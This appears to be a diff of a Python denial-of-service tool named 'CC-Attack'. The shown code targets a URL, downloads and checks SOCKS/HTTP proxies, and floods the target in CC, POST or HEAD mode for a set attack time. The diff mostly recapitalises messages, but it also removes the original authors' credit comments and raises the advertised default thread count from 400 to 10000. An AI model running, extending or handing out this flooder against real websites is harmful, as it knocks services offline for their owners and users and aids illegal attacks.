@@ -68,7 +68,7 @@ referers = [
 	"https://www.google.co.ao/search?q=",
 ]
 
-######### Default value ########
+######### Default Value ########
 mode = "cc"
 url = ""
 proxy_ver = "5"
@@ -187,7 +187,7 @@ def ParseUrl(original_url):
 		url = original_url[8:]
 		protocol = "https"
 	else:
-		print("> That looks like not a correct url.")
+		print("> That Looks Like Not A Correct Url.")
 		exit()
 	#http(s)://www.example.com:1337/xxx ==> www.example.com:1337/xxx
 	#print(url) #for debug
@@ -210,7 +210,7 @@ def InputOption(question,options,default):
 		if ans == "":
 			ans = default
 		elif ans not in options:
-			print("> Please enter the correct option")
+			print("> Please Enter The Correct Option")
 			ans = ""
 			continue
 	return ans
@@ -380,7 +380,7 @@ def slow(conn,proxy_type):
 '''		
 		
 nums = 0
-def checking(lines,proxy_type,ms,rlock,):#Proxy checker coded by Leeon123
+def checking(lines,proxy_type,ms,rlock,):
 	global nums
 	global proxies
 	proxy = lines.strip().split(":")
@@ -419,7 +419,7 @@ def checking(lines,proxy_type,ms,rlock,):#Proxy checker coded by Leeon123
 			err +=1
 	nums += 1
 
-def check_socks(ms):#Coded by Leeon123
+def check_socks(ms):
 	global nums
 	thread_list=[]
 	rlock = threading.RLock()
@@ -435,23 +435,23 @@ def check_socks(ms):#Coded by Leeon123
 			th.start()
 		thread_list.append(th)
 		time.sleep(0.01)
-		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
+		sys.stdout.write("> Checked "+str(nums)+" Proxies\r")
 		sys.stdout.flush()
 	for th in list(thread_list):
 		th.join()
-		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
+		sys.stdout.write("> Checked "+str(nums)+" Proxies\r")
 		sys.stdout.flush()
-	print("\r\n> Checked all proxies, Total Worked:"+str(len(proxies)))
-	#ans = input("> Do u want to save them in a file? (y/n, default=y)")
+	print("\r\n> Checked All Proxies, Total Worked :"+str(len(proxies)))
+	#ans = input("> Do U Want To Save Them İn A File? (y/n, default=y)")
 	#if ans == "y" or ans == "":
 	with open(out_file, 'wb') as fp:
 		for lines in list(proxies):
 			fp.write(bytes(lines,encoding='utf8'))
 		fp.close()
-	print("> They are saved in "+out_file)
+	print("> They Are Saved İn "+out_file)
 			
 def check_list(socks_file):
-	print("> Checking list")
+	print("> Checking List")
 	temp = open(socks_file).readlines()
 	temp_list = []
 	for i in temp:
@@ -488,7 +488,7 @@ def DownloadProxies(proxy_ver):
 			except:
 				pass
 		f.close()
-		try:#credit to All3xJ
+		try:
 			r = requests.get("https://www.socks-proxy.net/",timeout=5)
 			part = str(r.content)
 			part = part.split("<tbody>")
@@ -558,24 +558,24 @@ def DownloadProxies(proxy_ver):
 			except:
 				pass
 		f.close()
-	print("> Have already downloaded proxies list as "+out_file)
+	print("> Have Already Downloaded Proxies List As "+out_file)
 
 def PrintHelp():
 	print('''===============  CC-Attack Help List  ===============
-   -h/help   | showing this message
-   -url      | set target url
-   -m/mode   | set program mode
-   -data     | set post data path (only works on post mode)
-             | (Example: -data data.json)
-   -cookies  | set cookies (Example: 'id:xxx;ua:xxx')
-   -v        | set proxy type (4/5/http, default:5)
-   -t        | set threads number (default:400)
-   -f        | set proxies file (default:socks.txt)
-   -b        | enable/disable brute mode
-             | Enable=1 Disable=0  (default:0)
-   -s        | set attack time(default:60)
-   -down     | download proxies
-   -check    | check proxies
+   -h/help   | Showing This Message
+   -url      | Set Target Url
+   -m/mode   | Set Program Mode
+   -data     | Set Post Data Path (Only Works On Post Mode)
+             | (Example : -data data.json)
+   -cookies  | Set Cookies (Example : 'id:xxx;ua:xxx')
+   -v        | Set Proxy Type (4/5/http, default:5)
+   -t        | Set Threads Number (default : 10000)
+   -f        | set proxies file (Default : socks.txt)
+   -b        | Enable/Disable Brute Mode
+             | Enable=1 Disable=0  (Default : 0)
+   -s        | Set Attack Time(Default : 60)
+   -down     | Download Proxies
+   -check    | Check Proxies
 =====================================================''')
 
 
@@ -596,7 +596,7 @@ def main():
 	proxy_type = 5
 	period = 60
 	help = False
-	print("> Mode: [cc/post/head]")#slow]")
+	print("> Mode : [CC/POST/HEAD]")#slow]")
 	for n,args in enumerate(sys.argv):
 		if args == "-help" or args =="-h":
 			help =True
@@ -616,7 +616,7 @@ def main():
 			elif proxy_ver == "http":
 				proxy_type = 0
 			elif proxy_ver not in ["4","5","http"]:
-				print("> -v Argument Error (only 4/5/http)")
+				print("> -v Argument Error (Only 4/5/http)")
 				return
 		if args == "-b":
 			if sys.argv[n+1] == "1":
@@ -672,7 +672,7 @@ def main():
 		PrintHelp()
 
 	if target == "":
-		print("> There is no target. End of process ")
+		print("> There İs No Target. End Of Process ")
 		return
 	'''
 	if mode == "slow":
